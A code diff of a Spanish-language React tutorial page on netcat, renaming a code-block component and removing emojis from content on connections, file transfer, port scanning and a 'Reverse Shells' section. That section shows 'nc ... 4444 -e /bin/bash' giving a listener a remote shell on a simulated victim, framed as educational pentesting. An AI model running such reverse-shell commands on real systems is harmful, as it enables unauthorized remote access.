@@ -4,7 +4,7 @@ import Lista from "../../../componentes/moleculas/lista.jsx";
 import Texto from "../../../componentes/atomos/texto.jsx";
 import Titulo from "../../../componentes/moleculas/titulo.jsx";
 import { Tabla, TablaCabezera, TablaFila, TablaUnica } from "../../../componentes/moleculas/tabla.jsx";
-import CodeBlock from "../../../componentes/moleculas/codigo.jsx";
+import Codigo from "../../../componentes/moleculas/codigo.jsx";
 import Estructura, { TemarioAsideCompleto, TemarioCompleto } from "../../../componentes/organismos/estructura.jsx";
 
 function Temario({ className = "" }) {
@@ -71,73 +71,72 @@ function nameabcd({ }) {
             ética y controlada).
           </li>
         </Lista>
-        <Texto>Es conocida como el <strong>“cuchillo suizo de las redes”</strong>
-          🧰.</Texto>
+        <Texto>Es conocida como el <strong>“cuchillo suizo de las redes”</strong>.</Texto>
         <Linea />
         <Titulo title="h2" id="instalación">Instalación</Titulo>
         <Texto>En la mayoría de sistemas viene preinstalado:</Texto>
-        <CodeBlock code={`nc -h`} language="bash" />
+        <Codigo code={`nc -h`} language="bash" />
         <Texto>Sí no lo tienes:</Texto>
         <Texto><strong>Linux (Debian/Ubuntu):</strong></Texto>
-        <CodeBlock code={`sudo apt install netcat`} language="bash" />
+        <Codigo code={`sudo apt install netcat`} language="bash" />
         <Texto><strong>Windows:</strong> Puedes usar <strong>Ncat</strong> (parte de
-          Nmap): 👉 <Enlace href="https://nmap.org/ncat/">https://nmap.org/ncat/</Enlace ></Texto>
+          Nmap): <Enlace href="https://nmap.org/ncat/">https://nmap.org/ncat/</Enlace ></Texto>
         <Linea />
         <Titulo title="h2" id="sintaxis-general">Sintaxis general</Titulo>
-        <CodeBlock code={`nc [opciones] [host] [puerto]`} language="bash" />
+        <Codigo code={`nc [opciones] [host] [puerto]`} language="bash" />
         <Linea />
         <Titulo title="h2" id="modos-principales-de-uso">Modos principales de uso</Titulo>
         <Titulo title="h3" id="cliente-tcp">Cliente TCP</Titulo>
         <Texto>Conectarse a un servidor:</Texto>
-        <CodeBlock code={`nc 127.0.0.1 8080`} language="bash" />
+        <Codigo code={`nc 127.0.0.1 8080`} language="bash" />
         <Texto>Esto abre una conexión al puerto 8080 del localhost.</Texto>
         <Titulo title="h3" id="servidor-tcp">Servidor TCP</Titulo>
         <Texto>Escuchar conexiones:</Texto>
-        <CodeBlock code={`nc -l -p 8080`} language="bash" />
-        <Texto>🔹 -l → modo escucha</Texto>
-        <Texto>🔹 -p → especifica el puerto</Texto>
+        <Codigo code={`nc -l -p 8080`} language="bash" />
+        <Texto>-l → modo escucha</Texto>
+        <Texto>-p → especifica el puerto</Texto>
         <Texto>Luego, desde otro terminal:</Texto>
-        <CodeBlock code={`nc 127.0.0.1 8080`} language="bash" />
+        <Codigo code={`nc 127.0.0.1 8080`} language="bash" />
         <Texto>Ahora puedes <strong>enviar mensajes entre ambos terminales (chat
           simple)</strong>.</Texto>
         <Linea />
         <Titulo title="h2" id="udp-en-lugar-de-tcp">UDP en lugar de TCP</Titulo>
         <Texto>Para usar <strong>UDP</strong> en vez de TCP:</Texto>
-        <CodeBlock code={`# Servidor
+        <Codigo code={`# Servidor
 nc -u -l -p 6000
 
 # Cliente
 nc -u 127.0.0.1 6000`} language="bash" />
-        <Texto>🔹 -u → activa modo UDP.</Texto>
+        <Texto> -u → activa modo UDP.</Texto>
         <Linea />
         <Titulo title="h2" id="transferencia-de-archivos">Transferencia de archivos</Titulo>
         <Titulo title="h3" id="enviar-un-archivo">Enviar un archivo</Titulo>
         <Texto>Servidor que recibirá:</Texto>
-        <CodeBlock code={`nc -l -p 5000 > archivo_recibido.txt`} language="bash" />
+        <Codigo code={`nc -l -p 5000 > archivo_recibido.txt`} language="bash" />
         <Texto>Cliente que envía:</Texto>
-        <CodeBlock code={`nc 127.0.0.1 5000 < archivo.txt`} language="bash" />
-        <Texto>👉 El archivo archivo.txt se envía al servidor.</Texto>
+        <Codigo code={`nc 127.0.0.1 5000 < archivo.txt`} language="bash" />
+        <Texto>El archivo archivo.txt se envía al servidor.</Texto>
         <Linea />
         <Titulo title="h2" id="chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
           (TCP)</Titulo>
         <Texto>En una máquina:</Texto>
-        <CodeBlock code={`nc -l -p 4000`} language="bash" />
+        <Codigo code={`nc -l -p 4000`} language="bash" />
         <Texto>En otra:</Texto>
-        <CodeBlock code={`nc IP_DEL_SERVIDOR 4000`} language="bash" />
+        <Codigo code={`nc IP_DEL_SERVIDOR 4000`} language="bash" />
         <Texto>Ahora ambos pueden escribir y leer mensajes.</Texto>
         <Linea />
         <Titulo title="h2" id="escaneo-de-puertos">Escaneo de puertos</Titulo>
         <Texto>Netcat puede escanear qué puertos están abiertos en una máquina:</Texto>
-        <CodeBlock code={`nc -zv 192.168.1.10 20-80`} language="bash" />
-        <Texto>🔹 -z → modo “scan” sin enviar datos.</Texto>
-        <Texto>🔹 -v → modo verbose (muestra resultado).</Texto>
-        <Texto>🔹 20-80 → rango de puertos.</Texto>
+        <Codigo code={`nc -zv 192.168.1.10 20-80`} language="bash" />
+        <Texto>-z → modo “scan” sin enviar datos.</Texto>
+        <Texto>-v → modo verbose (muestra resultado).</Texto>
+        <Texto>20-80 → rango de puertos.</Texto>
         <Linea />
         <Titulo title="h2" id="redirección-de-entradasalida">Redirección de entrada/salida</Titulo>
         <Texto>Puedes usar <strong>pipes</strong> para automatizar tareas:</Texto>
-        <CodeBlock code={`echo "Hola servidor" | nc 127.0.0.1 8080`} language="bash" />
+        <Codigo code={`echo "Hola servidor" | nc 127.0.0.1 8080`} language="bash" />
         <Texto>O guardar la respuesta:</Texto>
-        <CodeBlock code={`nc 127.0.0.1 80  respuesta.txt`} language="bash" />
+        <Codigo code={`nc 127.0.0.1 80  respuesta.txt`} language="bash" />
         <Linea />
         <Titulo title="h2" id="reverse-shells-usos-éticos-y-educativos">Reverse Shells (usos
           éticos y educativos)</Titulo>
@@ -145,10 +144,10 @@ nc -u 127.0.0.1 6000`} language="bash" />
           inversa</strong>, usadas en <strong>pentesting</strong> (no
           ilegalmente).</Texto>
         <Titulo title="h3" id="en-el-servidor-escuchando">En el servidor (escuchando)</Titulo>
-        <CodeBlock code={`nc -l -p 4444 -v`} language="bash" />
+        <Codigo code={`nc -l -p 4444 -v`} language="bash" />
         <Titulo title="h3" id="en-la-víctima-simulada">En la víctima (simulada)</Titulo>
-        <CodeBlock code={`nc 192.168.1.100 4444 -e /bin/bash`} language="bash" />
-        <Texto>👉 Esto le da al servidor una consola remota de la otra máquina.
+        <Codigo code={`nc 192.168.1.100 4444 -e /bin/bash`} language="bash" />
+        <Texto>Esto le da al servidor una consola remota de la otra máquina.
           <em>(Solo en entornos controlados o de práctica legal.)</em>
         </Texto>
         <Linea />
@@ -183,17 +182,17 @@ nc -u 127.0.0.1 6000`} language="bash" />
             </TablaFila>
             <TablaFila>
               <TablaUnica>-e &lt;comando&gt;</TablaUnica>
-              <TablaUnica>Ejecuta un programa tras conectar (⚠️ uso ético)</TablaUnica>
+              <TablaUnica>Ejecuta un programa tras conectar (uso ético)</TablaUnica>
             </TablaFila>
           </tbody>
         </Tabla>
         <Linea />
         <Titulo title="h2" id="ejemplo-práctico-completo">Ejemplo práctico completo</Titulo>
         <Titulo title="h3" id="crear-servidor-de-eco">Crear servidor de eco</Titulo>
-        <CodeBlock code={`# Servidor
+        <Codigo code={`# Servidor
 nc -l -p 1234 -v`} language="bash" />
         <Titulo title="h3" id="cliente">Cliente</Titulo>
-        <CodeBlock code={`nc 127.0.0.1 1234`} language="bash" />
+        <Codigo code={`nc 127.0.0.1 1234`} language="bash" />
         <Texto>Ahora cualquier texto que envíes se reflejará entre ambos.</Texto>
         <Linea />
         <Titulo title="h2" id="resumen-rápido">Resumen rápido</Titulo>
